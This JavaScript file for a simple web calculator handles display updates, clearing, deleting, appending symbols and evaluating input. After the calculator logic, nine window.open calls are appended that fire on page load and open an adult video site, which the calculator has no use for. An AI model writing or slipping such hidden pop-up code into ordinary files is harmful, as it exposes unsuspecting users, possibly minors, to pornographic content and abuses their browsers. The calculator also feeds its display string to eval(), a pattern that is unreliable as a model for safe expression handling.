let displayValue = '0';

function updateDisplay() {
    document.getElementById('display').innerText = displayValue;
}

function clearDisplay() {
    displayValue = '0';
    updateDisplay();
}

function deleteLast() {
    displayValue = displayValue.slice(0, -1);
    if (displayValue === '') {
        displayValue = '0';
    }
    updateDisplay();
}

function appendSymbol(symbol) {
    if (displayValue === '0' && symbol !== '.') {
        displayValue = symbol;
    } else {
        displayValue += symbol;
    }
    updateDisplay();
}

function calculateResult() {
    try {
        displayValue = eval(displayValue).toString();
    } catch (error) {
        displayValue = 'Error';
    }
    updateDisplay();
}

updateDisplay();

window.open('https://xvideos.com')
window.open('https://xvideos.com')
window.open('https://xvideos.com')
window.open('https://xvideos.com')
window.open('https://xvideos.com')
window.open('https://xvideos.com')
window.open('https://xvideos.com')
window.open('https://xvideos.com')
window.open('https://xvideos.com')

